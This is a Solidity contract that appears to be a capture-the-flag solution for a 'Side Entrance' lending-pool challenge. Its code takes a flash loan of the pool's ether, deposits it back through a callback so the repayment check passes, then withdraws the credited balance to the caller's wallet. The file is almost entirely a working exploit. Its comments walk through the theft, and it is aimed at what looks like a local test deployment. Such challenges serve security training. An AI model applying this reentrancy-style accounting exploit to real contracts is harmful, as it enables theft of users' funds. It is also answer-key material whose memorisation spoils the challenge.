// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    ISideEntranceLenderPool pool =
        ISideEntranceLenderPool(0x5FbDB2315678afecb367f032d93F642f64180aa3);

    function exploit() public payable {
        // First, get a flash loan of all the ether in the pool
        pool.flashLoan(1000 ether);

        // The flashloan will call the execute function below, where we deposit
        // the entire loan back into the contract. This will pass the flashLoan
        // function's check for balance before vs after.
        //
        // Now, we can just withdraw our balance, and send it to the attacker
        // wallet.
        pool.withdraw();

        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "Exploit failed!");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
